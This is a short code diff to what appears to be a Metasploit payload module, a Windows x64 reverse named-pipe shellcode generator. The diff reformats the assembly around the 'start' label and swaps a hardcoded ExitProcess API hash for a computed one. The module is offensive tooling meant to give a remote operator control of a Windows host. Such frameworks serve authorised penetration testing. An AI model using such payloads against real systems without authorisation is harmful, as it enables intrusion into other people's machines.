@@ -59,8 +59,8 @@ module Payload::Windows::ReverseNamedPipe_x64
       and rsp, ~0xF           ;  Ensure RSP is 16 byte aligned
       call start              ; Call start, this pushes the address of 'api_call' onto the stack.
       #{asm_block_api}
-      start:
-        pop rbp               ; block API pointer
+     start:
+      pop rbp                 ; block API pointer
       #{asm_reverse_named_pipe(opts)}
     ^
     Metasm::Shellcode.assemble(Metasm::X64.new, combined_asm).encode_string
@@ -145,7 +145,7 @@ module Payload::Windows::ReverseNamedPipe_x64
     else
       asm << %Q^
       failure:
-        push 0x56A2B5F0         ; hardcoded to exitprocess for size
+        push #{Rex::Text.block_api_hash('kernel32.dll', 'ExitProcess')}
         call rbp
       ^
     end
